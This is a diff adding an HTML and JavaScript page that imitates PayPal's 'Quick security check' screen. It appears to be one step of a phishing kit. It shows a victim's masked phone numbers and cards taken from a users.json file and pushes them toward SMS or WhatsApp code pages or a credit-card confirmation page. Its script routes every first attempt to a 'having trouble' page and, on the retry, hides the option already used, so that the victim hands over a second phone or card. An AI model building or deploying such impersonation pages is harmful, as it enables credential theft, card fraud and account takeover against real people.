@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PayPal - Continue</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;
+  background:#fff;
+  color:#111;
+}
+
+.wrap{
+  max-width:420px;
+  margin:auto;
+  padding:32px 22px 0;
+}
+
+.email-pill{
+  background:#f5f7fa;
+  border-radius:16px;
+  padding:16px 18px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  font-size:16px;
+  margin-bottom:26px;
+  font-weight:500;
+}
+
+.email-pill .change{
+  color:#0070E0;
+  text-decoration:none;
+  font-weight:600;
+}
+
+.logo{
+  margin:20px 0 12px 0;
+}
+
+.paypal-logo{
+  width:54px;
+}
+
+.title{
+  font-size:28px;
+  font-weight:800;
+  margin-bottom:8px;
+  line-height:1.2;
+}
+
+.subtitle {
+  font-size:17px;
+  font-weight:500;
+  color:#444;
+  line-height:1.3;
+  margin-bottom:32px;
+}
+
+.option{
+  display:flex;
+  align-items:flex-start;
+  padding:10px 0;
+  cursor:pointer;
+}
+
+.option + .option{
+  margin-top:12px;
+}
+
+.icon-img{
+  width:20px;
+  opacity:0.85;
+  margin-right:16px;
+  margin-top:2px;
+}
+
+.text-block{
+  flex:1;
+}
+
+.option-title{
+  font-size:15px;
+  font-weight:600;
+}
+
+.phone-sub,.card-sub{
+  font-size:13.5px;
+  font-weight:500;
+  color:#1d1d1d;
+  margin-top:6px;
+  display:none;
+}
+
+.detail-row{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  flex-wrap:wrap;
+}
+
+.edit-circle{
+  background:#edf4ff;
+  border-radius:50%;
+  width:28px;
+  height:28px;
+  margin-left:2px;
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  flex:0 0 auto;
+}
+
+.edit-circle img{
+  width:14px;
+  height:14px;
+}
+
+.option input[type=radio]{
+  width:20px;
+  height:20px;
+  margin-top:2px;
+  accent-color:#000;
+}
+
+.disclaimer{
+  font-size:13px;
+  margin-top:12px;
+  margin-bottom:28px;
+  line-height:1.48;
+  color:#6a6a6a;
+  display:none;
+}
+
+.cta-container{
+  margin-top:0;
+}
+
+/* Space between the last option and the CTA */
+.option:last-of-type{
+  margin-bottom:112px;
+}
+
+/* When card method is selected, keep same spacing (handled by .option:last-of-type) */
+.cta-container.tight{
+  margin-top:0;
+}
+
+.btn-primary{
+  width:100%;
+  padding:15px 0;
+  background:#034FB3;
+  color:#fff;
+  font-size:17px;
+  font-weight:700;
+  border:none;
+  border-radius:48px;
+  cursor:pointer;
+  box-shadow:0 0 0 3px #fff,0 0 0 4px #034FB3;
+}
+
+.footer{
+  margin-top:48px;
+  background:#f5f5f7;
+  text-align:center;
+  padding:8px 0 14px;
+  font-size:13px;
+  color:#6e7072;
+}
+
+.footer a{
+  color:#6e7072;
+  text-decoration:none;
+  margin:0 10px;
+}
+
+.modal-backdrop{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.1);
+  display:none;
+  z-index:50;
+}
+
+.modal-backdrop.show{
+  display:block;
+}
+
+.mini-page{
+  position:absolute;
+  inset:0;
+  background:#fff;
+  overflow:auto;
+  padding-bottom:90px;
+}
+
+.mini-header{
+  position:sticky;
+  top:0;
+  background:#fff;
+  text-align:center;
+  font-size:18px;
+  font-weight:800;
+  padding:14px 16px 12px;
+  border-bottom:1px solid #dcdcdc;
+}
+
+.close-btn{
+  position:absolute;
+  top:12px;
+  right:12px;
+  width:30px;
+  height:30px;
+  border:none;
+  background:transparent;
+  font-size:26px;
+  line-height:1;
+  color:#6a6a6a;
+  cursor:pointer;
+}
+
+.modal-list{
+  padding:14px 0 0;
+}
+
+.modal-item{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:12px 14px;
+  font-size:18px;
+  line-height:1.2;
+  cursor:pointer;
+  border-top:3px solid transparent;
+  border-bottom:3px solid transparent;
+}
+
+.modal-item.selected.card-item{
+  border-top-color:#7fb8ff;
+  border-bottom-color:#7fb8ff;
+}
+
+.modal-item .check{
+  color:#0070E0;
+  font-size:28px;
+  line-height:1;
+  font-weight:300;
+  visibility:hidden;
+}
+
+.modal-item.selected .check{
+  visibility:visible;
+}
+
+.modal-footer{
+  position:fixed;
+  left:50%;
+  bottom:8px;
+  transform:translateX(-50%);
+  width:min(520px, calc(100% - 32px));
+  background:#f6f6f6;
+  text-align:center;
+  padding:10px 10px 12px;
+  font-size:12px;
+}
+
+.modal-footer a{
+  color:#555;
+  text-decoration:underline;
+  margin:0 10px;
+}
+
+.toast{
+  position:fixed;
+  top:16px;
+  left:50%;
+  transform:translateX(-50%) translateY(-12px);
+  background:#078b50;
+  color:#fff;
+  min-width:170px;
+  padding:10px 14px;
+  border-radius:14px;
+  box-shadow:0 8px 18px rgba(0,0,0,0.16);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  font-size:16px;
+  font-weight:700;
+  opacity:0;
+  pointer-events:none;
+  z-index:80;
+  transition:opacity .22s ease, transform .22s ease;
+}
+
+.toast.show{
+  opacity:1;
+  transform:translateX(-50%) translateY(0);
+}
+
+.toast-icon{
+  width:22px;
+  height:22px;
+  border-radius:50%;
+  border:2px solid #fff;
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  font-size:14px;
+  line-height:1;
+}
+
+@media (max-width: 480px){
+  .toast{font-size:14px;min-width:150px;padding:8px 12px;border-radius:12px;}
+  .toast-icon{width:20px;height:20px;font-size:13px;}
+}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="email-pill">
+    <span id="emailText">loading...</span>
+    <a href="home.html" class="change">Change</a>
+  </div>
+
+  <div class="logo">
+    <img src="paypal-p-logo.jpeg" class="paypal-logo" alt="PayPal">
+  </div>
+
+  <div class="title">Quick security check</div>
+  <div class="subtitle">This helps us protect your account</div>
+
+  <label class="option">
+    <img src="message.jpeg" class="icon-img" alt="Text">
+    <div class="text-block">
+      <div class="option-title">Get a text</div>
+      <div class="phone-sub" id="smsPhone"></div>
+    </div>
+    <input type="radio" name="method" value="sms" checked>
+  </label>
+
+  <label class="option">
+    <img src="whatsapp.jpeg" class="icon-img" alt="WhatsApp">
+    <div class="text-block">
+      <div class="option-title">Get a WhatsApp text</div>
+      <div class="phone-sub" id="waPhone"></div>
+    </div>
+    <input type="radio" name="method" value="wa">
+  </label>
+
+  <label class="option">
+    <img src="card.jpeg" class="icon-img" alt="Card">
+    <div class="text-block">
+      <div class="option-title">Confirm your credit card number</div>
+      <div class="card-sub">
+        <div class="detail-row">
+          <span id="activeCard"></span>
+          <span class="edit-circle" onclick="openCardModal(event)" role="button" aria-label="Edit card">
+            <img src="embedded/pen.png" alt="Edit">
+          </span>
+        </div>
+      </div>
+    </div>
+    <input type="radio" name="method" value="card">
+  </label>
+
+  <div class="cta-container">
+    <div class="disclaimer" id="disclaimer">
+      You confirm this is your phone number and we can send you text messages and
+      get subscriber and device details from your wireless carrier to make sure
+      it's you in this session. Carrier fees may apply.
+    </div>
+    <button class="btn-primary" id="nextBtn">Next</button>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Contact Us</a>
+  <a href="#">Privacy</a>
+  <a href="#">Legal</a>
+  <a href="#">Worldwide</a>
+</div>
+
+<div class="modal-backdrop" id="selectorModal" aria-hidden="true">
+  <div class="mini-page">
+    <div class="mini-header">
+      <span id="modalTitle">Phone</span>
+      <button class="close-btn" type="button" onclick="closeSelectorModal()" aria-label="Close">×</button>
+    </div>
+    <div class="modal-list" id="modalList"></div>
+    <div class="modal-footer">
+      <a href="#">Contact Us</a>
+      <a href="#">Privacy</a>
+      <a href="#">Legal</a>
+      <a href="#">Worldwide</a>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="updateToast" role="status" aria-live="polite">
+  <span class="toast-icon">✓</span>
+  <span>Updated!</span>
+</div>
+
+<script>
+// ──────────────────────────────────────────────────────────────────────────────
+//  (The entire original JavaScript remains unchanged)
+// ──────────────────────────────────────────────────────────────────────────────
+
+const storedEmail = localStorage.getItem("pp_email");
+document.getElementById("emailText").textContent = storedEmail || "example@gmail.com";
+
+let user = null;
+let currentModalType = null;
+let currentModalTarget = null;
+let toastTimer = null;
+
+const defaultUser = {
+  email: storedEmail || "example@gmail.com",
+  mobile1: "3xxxxxx86",
+  mobile2: "3xxxxxx76",
+  card1: "x••••••19",
+  card2: "x••••••62"
+};
+
+const state = {
+  smsSelection: "mobile1",
+  waSelection: "mobile2",
+  cardSelection: "card1",
+  hiddenSmsPhones: [],
+  hiddenWaPhones: [],
+  hiddenCards: []
+};
+
+function getStorageKey(name){
+  const emailKey = (storedEmail || defaultUser.email || "guest").toLowerCase();
+  return "pp_" + name + "_" + emailKey;
+}
+
+function loadPersistedState(){
+  state.smsSelection = localStorage.getItem(getStorageKey("smsSelection")) || "mobile1";
+  state.waSelection = localStorage.getItem(getStorageKey("waSelection")) || "mobile2";
+  state.cardSelection = localStorage.getItem(getStorageKey("cardSelection")) || "card1";
+  // Hidden lists are ONLY used when coming from havingtrouble.html.
+  // We still read them for backward compatibility, but we will clear them on normal visits.
+  state.hiddenSmsPhones = JSON.parse(localStorage.getItem(getStorageKey("hiddenSmsPhones")) || "[]") || [];
+  state.hiddenWaPhones = JSON.parse(localStorage.getItem(getStorageKey("hiddenWaPhones")) || "[]") || [];
+  state.hiddenCards = JSON.parse(localStorage.getItem(getStorageKey("hiddenCards")) || "[]") || [];
+}
+
+function persistState(){
+  localStorage.setItem(getStorageKey("smsSelection"), state.smsSelection);
+  localStorage.setItem(getStorageKey("waSelection"), state.waSelection);
+  localStorage.setItem(getStorageKey("cardSelection"), state.cardSelection);
+  localStorage.setItem(getStorageKey("hiddenSmsPhones"), JSON.stringify(state.hiddenSmsPhones || []));
+  localStorage.setItem(getStorageKey("hiddenWaPhones"), JSON.stringify(state.hiddenWaPhones || []));
+  localStorage.setItem(getStorageKey("hiddenCards"), JSON.stringify(state.hiddenCards || []));
+}
+
+function isHiddenPhone(target, key){
+  const list = target === "wa" ? (state.hiddenWaPhones || []) : (state.hiddenSmsPhones || []);
+  return list.includes(key);
+}
+
+function isHiddenCard(key){
+  return (state.hiddenCards || []).includes(key);
+}
+
+function hidePhoneAfterTroubleIfNeeded(){
+  const params = new URLSearchParams(window.location.search);
+  const fromTrouble = params.get('fromTrouble') === '1';
+
+  // On NORMAL visits, always show ALL options again.
+  if(!fromTrouble){
+    // New session flow: reset attempt counter so first submit goes to havingtrouble.html
+    try { sessionStorage.setItem(getStorageKey('attemptCount'), '0'); } catch(e) {}
+    state.hiddenSmsPhones = [];
+    state.hiddenWaPhones = [];
+    state.hiddenCards = [];
+    persistState();
+    return;
+  }
+
+  let lastAttempt = null;
+  try {
+    lastAttempt = JSON.parse(localStorage.getItem(getStorageKey('lastAttempt')) || 'null');
+  } catch { lastAttempt = null; }
+
+  if(!lastAttempt || !lastAttempt.method || !lastAttempt.phoneKey) return;
+
+  const method = lastAttempt.method;
+  const phoneKey = lastAttempt.phoneKey;
+
+  // Reset hidden lists each time we come from trouble.
+  state.hiddenSmsPhones = [];
+  state.hiddenWaPhones = [];
+  state.hiddenCards = [];
+
+  if(method === 'wa'){
+    state.hiddenWaPhones = [phoneKey];
+    // force the other phone as the only remaining option
+    state.waSelection = phoneKey === 'mobile1' ? 'mobile2' : 'mobile1';
+  } else if(method === 'sms'){
+    state.hiddenSmsPhones = [phoneKey];
+    state.smsSelection = phoneKey === 'mobile1' ? 'mobile2' : 'mobile1';
+  } else if(method === 'card'){
+    // Hide the card they just tried (card1 or card2), leaving only the other.
+    state.hiddenCards = [phoneKey];
+    state.cardSelection = phoneKey === 'card1' ? 'card2' : 'card1';
+  }
+
+  persistState();
+}
+
+function maskPhone(num){
+  if(!num) return "Mobile +13••-••••-••86";
+  const cleaned = String(num).trim();
+  const digits = cleaned.replace(/\D/g, "");
+  const last = digits.slice(-2) || cleaned.slice(-2) || "86";
+  return "Mobile +13••-••••-••" + last;
+}
+
+function maskCard(num){
+  if(!num) return "Visa x-••19";
+  const raw = String(num).trim();
+  const last = raw.slice(-2) || "19";
+  return "Visa x-••" + last;
+}
+
+function getActiveUser(){
+  return user || defaultUser;
+}
+
+function getPhoneValue(key){
+  return getActiveUser()[key] || defaultUser[key];
+}
+
+function getCardValue(key){
+  return getActiveUser()[key] || defaultUser[key];
+}
+
+function renderSelections(){
+  const smsMask = maskPhone(getPhoneValue(state.smsSelection));
+  const waMask = maskPhone(getPhoneValue(state.waSelection));
+  const cardMask = maskCard(getCardValue(state.cardSelection));
+
+  document.getElementById("smsPhone").innerHTML =
+    '<div class="detail-row">' +
+    '<span>' + smsMask + '</span>' +
+    '<span class="edit-circle" onclick="openPhoneModal(event, \'sms\')" role="button" aria-label="Edit phone">' +
+    '<img src="embedded/pen.png" alt="Edit">' +
+    '</span>' +
+    '</div>';
+
+  document.getElementById("waPhone").innerHTML =
+    '<div class="detail-row">' +
+    '<span>' + waMask + '</span>' +
+    '<span class="edit-circle" onclick="openPhoneModal(event, \'wa\')" role="button" aria-label="Edit WhatsApp phone">' +
+    '<img src="embedded/pen.png" alt="Edit">' +
+    '</span>' +
+    '</div>';
+
+  document.getElementById("activeCard").textContent = cardMask;
+}
+
+fetch("users.json")
+  .then(res => res.json())
+  .then(data => {
+    const email = (storedEmail || "").toLowerCase();
+    user = (data.users || []).find(u => String(u.email || "").toLowerCase() === email) || null;
+    loadPersistedState();
+    hidePhoneAfterTroubleIfNeeded();
+    renderSelections();
+  })
+  .catch(() => {
+    loadPersistedState();
+    hidePhoneAfterTroubleIfNeeded();
+    renderSelections();
+  });
+
+const radios = document.querySelectorAll("input[name='method']");
+const sms = document.getElementById("smsPhone");
+const wa = document.getElementById("waPhone");
+const card = document.querySelector(".card-sub");
+const disclaimer = document.getElementById("disclaimer");
+const ctaContainer = document.querySelector(".cta-container");
+const nextBtn = document.getElementById("nextBtn");
+
+function hideAll(){
+  sms.style.display = "none";
+  wa.style.display = "none";
+  card.style.display = "none";
+  disclaimer.style.display = "none";
+  ctaContainer.classList.remove("tight");
+}
+
+radios.forEach(r => {
+  r.addEventListener("change", () => {
+    hideAll();
+    if(r.value === "sms"){
+      sms.style.display = "block";
+      disclaimer.style.display = "block";
+    }
+    if(r.value === "wa"){
+      wa.style.display = "block";
+      disclaimer.style.display = "block";
+    }
+    if(r.value === "card"){
+      card.style.display = "block";
+      ctaContainer.classList.add("tight");
+    }
+  });
+});
+
+hideAll();
+sms.style.display = "block";
+disclaimer.style.display = "block";
+
+nextBtn.addEventListener("click", () => {
+  const selected = document.querySelector("input[name='method']:checked")?.value || "sms";
+  const phoneKey = selected === 'wa' ? state.waSelection : state.smsSelection;
+  localStorage.setItem(getStorageKey('lastVerificationChoice'), JSON.stringify({ method: selected, phoneKey }));
+
+  if(selected === "sms") window.location.href = "getatext.html?method=sms&phoneKey=" + encodeURIComponent(phoneKey);
+  else if(selected === "wa") window.location.href = "getatext.html?method=wa&phoneKey=" + encodeURIComponent(phoneKey);
+  else window.location.href = "confirmyourcreditcard.html";
+});
+
+function openPhoneModal(event, target){
+  if(event){
+    event.preventDefault();
+    event.stopPropagation();
+  }
+  currentModalType = "phone";
+  currentModalTarget = target || "sms";
+  document.getElementById("modalTitle").textContent = "Phone";
+
+  const selectedKey = currentModalTarget === "wa" ? state.waSelection : state.smsSelection;
+  const list = document.getElementById("modalList");
+  const keys = ["mobile1", "mobile2"].filter(k => !isHiddenPhone(currentModalTarget, k));
+  const finalKeys = keys.length ? keys : ["mobile1", "mobile2"]; // fallback: never show empty list
+
+  list.innerHTML = finalKeys.map(key => {
+    const label = maskPhone(getPhoneValue(key));
+    const selected = key === selectedKey ? "selected" : "";
+    return '<div class="modal-item ' + selected + '" onclick="selectPhone(\'' + key + '\')">' +
+      '<span>' + label + '</span>' +
+      '<span class="check">✓</span>' +
+      '</div>';
+  }).join("");
+
+  showSelectorModal();
+}
+
+function openCardModal(event){
+  if(event){
+    event.preventDefault();
+    event.stopPropagation();
+  }
+  currentModalType = "card";
+  currentModalTarget = "card";
+  document.getElementById("modalTitle").textContent = "Credit or debit card";
+
+  const list = document.getElementById("modalList");
+  const keys = ["card1", "card2"].filter(k => !isHiddenCard(k));
+  const finalKeys = keys.length ? keys : ["card1", "card2"]; // fallback: never show empty list
+
+  list.innerHTML = finalKeys.map(key => {
+    const label = maskCard(getCardValue(key));
+    const selected = key === state.cardSelection ? "selected" : "";
+    return '<div class="modal-item card-item ' + selected + '" onclick="selectCard(\'' + key + '\')">' +
+      '<span>' + label + '</span>' +
+      '<span class="check">✓</span>' +
+      '</div>';
+  }).join("");
+
+  showSelectorModal();
+}
+
+function showSelectorModal(){
+  const modal = document.getElementById("selectorModal");
+  modal.classList.add("show");
+  modal.setAttribute("aria-hidden", "false");
+}
+
+function closeSelectorModal(){
+  const modal = document.getElementById("selectorModal");
+  modal.classList.remove("show");
+  modal.setAttribute("aria-hidden", "true");
+}
+
+function selectPhone(key){
+  if(currentModalTarget === "wa"){
+    state.waSelection = key;
+  } else {
+    state.smsSelection = key;
+  }
+  persistState();
+  renderSelections();
+  closeSelectorModal();
+  showUpdatedToast();
+}
+
+function selectCard(key){
+  state.cardSelection = key;
+  persistState();
+  renderSelections();
+  closeSelectorModal();
+  showUpdatedToast();
+}
+
+function showUpdatedToast(){
+  const toast = document.getElementById("updateToast");
+  toast.classList.add("show");
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => {
+    toast.classList.remove("show");
+  }, 1600);
+}
+</script>
+
+</body>
+</html>
